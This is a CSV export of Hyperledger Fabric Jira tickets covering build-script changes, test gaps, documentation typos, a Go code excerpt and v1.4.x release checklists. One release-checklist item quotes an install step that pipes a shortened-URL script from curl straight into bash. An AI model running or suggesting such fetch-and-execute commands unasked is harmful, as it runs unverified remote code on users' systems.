Remove s390x from Multiarch Script,FAB-17060,43299,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,13/Nov/19 10:13 AM,13/Nov/19 7:09 PM,28/Oct/23 3:09 AM,13/Nov/19 7:09 PM,,,,,,,,,,v1.4.4,v2.0.0,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014ir:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Audit orderer raft and cluster pkg for func pointers,FAB-17061,43300,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,guoger,guoger,13/Nov/19 2:30 PM,09/Jul/20 8:55 PM,28/Oct/23 3:09 AM,,,,,,,,,,,Future,,,,fabric-orderer,,,,,,,,,0,ipm,,,,,"As pointed out in [review|https://gerrit.hyperledger.org/r/c/fabric/+/34189/4/orderer/consensus/etcdraft/consenter.go#229], function pointers are heavily used in cluster and raft pkg, which are unconventional",,guoger,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zx",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jun/20 4:05 AM;wlahti;The link in the description is no longer available since it linked to gerrit. From looking at the code at that time, this seems to be some of the [code in question|https://github.com/hyperledger/fabric/blob/master/orderer/consensus/etcdraft/consenter.go] :
{code:go}
// when we have a system channel
if c.InactiveChainRegistry != nil {
  return NewChain(
    support,
    opts,
    c.Communication,
    rpc,
    c.BCCSP,
    func() (BlockPuller, error) {
      return NewBlockPuller(support, c.Dialer, c.OrdererConfig.General.Cluster, c.BCCSP)
    },
    func() {
      c.InactiveChainRegistry.TrackChain(support.ChannelID(), nil, func() { c.CreateChain(support.ChannelID()) })
    },
    nil,
  )
}

// when we do NOT have a system channel
return NewChain(
  support,
  opts,
  c.Communication,
  rpc,
  c.BCCSP,
  func() (BlockPuller, error) {
    return NewBlockPuller(support, c.Dialer, c.OrdererConfig.General.Cluster, c.BCCSP)
  },
  func() {
    c.Logger.Warning(""Start a follower.Chain: not yet implemented"")
    //TODO start follower.Chain
  },
  nil,
)

{code}
 

And [here|#diff-31c50bd6bdb92751de2354b5ac74099e] is the commit (without the gerrit reviews, of course).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Typos in Commercial Paper readme,FAB-17062,43301,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Low,Done,tatsu-sato,akshat_shah,akshat_shah,13/Nov/19 7:46 PM,17/Jun/20 8:50 AM,28/Oct/23 3:09 AM,17/Jun/20 8:50 AM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"Scanning through the readme, there are at least (maybe more) 5 typos. 

Typo 1: Just under *Setup*
{code:java}
will need a a machine
{code}
Typo 2: Also under *Setup*
{code:java}
file is in the the commercial-paper{code}
Typo 3: Also under *Setup*
{code:java}
ogranization{code}
Typo 4: Under *Install and instantiate contract* 
{code:java}
affect the choice of client langauge{code}
Typo 5: Under *Client Applications*
{code:java}
between the langauge of
{code}",,akshat_shah,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014iz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),akshat_shah,tatsu-sato,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
integrate cache with LoadCommittedVersion,FAB-17063,43309,12402,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,14/Nov/19 1:59 AM,21/Nov/19 3:05 AM,28/Oct/23 3:09 AM,21/Nov/19 3:05 AM,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014jv:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
close unit test gaps for individual functions in statecouchDB package,FAB-17064,43310,,Task,In Progress,FAB,Fabric,software,denyeart,,,Medium,,dereckluo,Senthil1,Senthil1,14/Nov/19 2:12 AM,04/Feb/20 11:55 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"Given that we have integrated cache with the commit path, the commit code has become sensitive. If either the cache is updated incorrectly or accessed incorrectly, we could do a wrong commit. It is possible to add a bug and pass the current unit-test. Hence, we need to perform per function unit-testing rather than only call ApplyUpdates() to cover all functions. For e.g., we need to have unit-test for the following functions:
 * buildCommitters()
 * buildCommittersForNs()
 * getRevisions()
 * addRevisionsFromCache()
 * executeCommitter()
 * LoadCommittedVersion()

and so on. The above list is not exhaustive. We need to identify all such functions in the commit path and add a unit-test.

 

Note that the above unit-test should cover all error path too.

 ",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:19",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE to specify collection name in transactions,FAB-17065,43311,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,dongming,dongming,14/Nov/19 4:09 AM,14/Nov/19 11:06 PM,28/Oct/23 3:09 AM,14/Nov/19 11:06 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,PTE needs to specify collection name in transactions that SDK can choose correspondent layout,,dongming,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16074,FAB-13006,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-2247,,,No,,Unset,No,,,"1|i000dj:i",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Nov/19 7:16 AM;scottz;Is this a DUP of FAB-13006 ?;;;","14/Nov/19 11:06 PM;dongming;withdraw since dup to FAB-13006;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update migrate.sh in operator tool ,FAB-17066,43313,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,14/Nov/19 4:14 AM,15/Nov/19 3:43 AM,28/Oct/23 3:09 AM,15/Nov/19 3:43 AM,v1.4.4,v2.0.0,,,,,,,,v1.4.4,v2.0.0,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzy",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Nov/19 4:21 AM;bharadwajambati1;[https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34371/];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix endorsement policy issue and include timeoutOpt in testclient,FAB-17067,43314,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,14/Nov/19 6:12 AM,15/Nov/19 4:23 AM,28/Oct/23 3:09 AM,15/Nov/19 4:23 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Fix endorsement policy issue and include timeoutOpt in testclient,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16240,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzo",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-1.4,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Nov/19 11:27 PM;suryalnvs;https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34373/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update the operations guide to include the /version endpoint,FAB-17068,43321,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,15/Nov/19 4:08 AM,15/Nov/19 5:43 AM,28/Oct/23 3:09 AM,15/Nov/19 5:43 AM,,,,,,,,,,v1.4.4,v2.0.0,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014lv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cut v1.4.4 release,FAB-17069,43322,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,15/Nov/19 4:28 AM,21/Nov/19 8:31 PM,28/Oct/23 3:09 AM,21/Nov/19 8:31 PM,,,,,,,,,,v1.4.4,,,,fabric-release,,,,,,,,,0,,,,,,"Prepare and publish the release of Hyperledger Fabric. The tasks are listed in execution order and I have indicated any dependencies in the description of each.

 ",,Berith,ChristopherFerris,denyeart,JonathanLevi,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16410,,,,,,,,,,FAB-17094,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014m3:",,,,,,,,,,,,,,,,,,,,Berith,ChristopherFerris,denyeart,JonathanLevi,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[CI] - verify release jobs to support release,FAB-17070,43323,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,rameshthoomu,denyeart,15/Nov/19 4:28 AM,15/Nov/19 4:45 AM,28/Oct/23 3:09 AM,15/Nov/19 4:45 AM,,,,,,,,,,,,,,fabric-ci,fabric-release,,,,,,,,0,fabric-ci,,,,,"Make sure all the release jobs & multiarch jobs are ready for the release.

*fabric* – fabric-release-jobs-x86_64 (included docker images and binaries)
 *fabric-ca* – Azure Pipelines (Include docker images and binaries)
 *fabric-chaincode-java* – fabric-chaincode-java-release-x86_64 ( javaenv image on x platform)

Multiarch jobs:
 [https://jenkins.hyperledger.org/view/multi-arch/]",,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014mb:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release fabric,FAB-17071,43324,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,15/Nov/19 4:28 AM,15/Nov/19 6:14 AM,28/Oct/23 3:09 AM,15/Nov/19 6:14 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"*MUST BE REBASED JUST BEFORE MERGING*

*----------*

{\{git checkout master }}

{{git pull}}

_*checkout the CR from Gerrit - be sure you have latest!!!*_ 

{{git checkout -b <newbranch>}}

{\{git rebase master }}

git commit --amend

*_make a tweak to commit message_*

git review

 

Check for clean CI passes

merge

----------------------

Changes

----------------------------

Update bootstrap.sh for latest baseimage:

export THIRDPARTY_IMAGE_VERSION=0.4.13

 

Update Makefile

{{BASE_VERSION}}
 {{PREV_VERSION}}

EXPERIMENTAL ?= false

 
 Update docs/source/install.rst 

e.g. 
 curl -sSL [https://goo.gl/6wtTN5] | bash -s 1.3.0-rc1--
  

grep code for last release number or rc1, ensure all other references updated.

{{release_notes/v1.3.0.txt should be created}}

{{docs/source/releases.rst should be updated with prose and link to GH release page}}

Update hard coded release version in cryptogen, configtxgen, configtxlator, idemixgen binaries, e.g. *common/tools/configtxlator/metadata/metadata.go* (try to resolve this in the future)

{{change log should be generated just *after* *rebasing* to pick up the last minute merged CRs and linked from docs/source/releases.rst}}

./scripts/changelog.sh v1.3.0-rc1 v1.3.0",,ChristopherFerris,denyeart,luomin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014mj:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,luomin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Nov/19 4:51 AM;denyeart;https://gerrit.hyperledger.org/r/#/c/fabric/+/34364/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prepare fabric for next release,FAB-17072,43325,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,15/Nov/19 4:28 AM,15/Nov/19 7:50 AM,28/Oct/23 3:09 AM,15/Nov/19 7:50 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"Note that this change must be stacked on the previous CR to prepare for the v1.4.0-rc1 release.

Update Makefile

BASE_VERSION = 1.4.0-rc1

PREV_VERSION = 1.3.0

 

Also, update master branch to have BASE_VERSION=1.4.0

Note: Release should be tagged prior to merging this ""prepare for next CR"".",,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014mr:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release fabric-ca,FAB-17073,43326,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,15/Nov/19 4:28 AM,16/Nov/19 1:57 AM,28/Oct/23 3:09 AM,15/Nov/19 6:14 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"*MUST BE REBASED JUST BEFORE MERGING*

Check for clean CI

Update Makefile

{{BASE_VERSION = 1.4.0-rc1}}
 {{PREV_VERSION = 1.3.0}}
 {{IS_RELEASE = true}}

change log should be generated just *after* *rebasing* to pick up the last minute merged CRs 
 ./scripts/changelog.sh v1.3.0 v1.4.0-rc1

update release_notes/v1.4.0.txt

 ",,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014mz:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Nov/19 4:50 AM;denyeart;https://github.com/hyperledger/fabric-ca/pull/66;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prepare fabric-ca for next release,FAB-17074,43327,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,15/Nov/19 4:28 AM,16/Nov/19 4:53 AM,28/Oct/23 3:09 AM,16/Nov/19 4:53 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"Note that this change must be stacked on the previous CR to prepare for the next release on the release-1.2 branch

1. Update Makefile

{{BASE_VERSION = 1.4.0}}
 {{PREV_VERSION = 1.4.0-rc1}}
 {{IS_RELEASE = false}}

2. Update lib/metadata/version.go

var Version = ""1.4.0""
  
 Note: Release should be tagged prior to merging this ""prepare for next CR"".

 Note, also update master branch with:

1. Update Makefile

{{BASE_VERSION = 1.4.0}}
 {{PREV_VERSION = 1.4.0-rc1}}
 {{IS_RELEASE = false}}

2. Update lib/metadata/version.go

var Version = ""1.4.0""",,aambati,ChristopherFerris,denyeart,rennman,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014n7:",,,,,,,,,,,,,,,,,,,,aambati,ChristopherFerris,denyeart,rennman,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Verify fabric, fabric-ca docker images are published",FAB-17075,43328,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,rameshthoomu,denyeart,15/Nov/19 4:28 AM,16/Nov/19 4:08 AM,28/Oct/23 3:09 AM,16/Nov/19 4:08 AM,,,,,,,,,,,,,,fabric-ci,fabric-release,,,,,,,,0,,,,,,"Verify fabric, fabric-ca docker images are published to hyperledger docker-hub account and make sure fabric-binaries are published to nexus repository.",,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014nf:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Push multiarch manifests,FAB-17076,43329,43322,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,ChristopherFerris,denyeart,15/Nov/19 4:28 AM,16/Nov/19 4:08 AM,28/Oct/23 3:09 AM,16/Nov/19 4:08 AM,,,,,,,,,,,,,,fabric-build,,,,,,,,,0,,,,,,BASE_VERSION=1.4.0-rc2 TWO_DIGIT_VERSION=1.4 scripts/multiarch.sh user password,,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i014nn:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
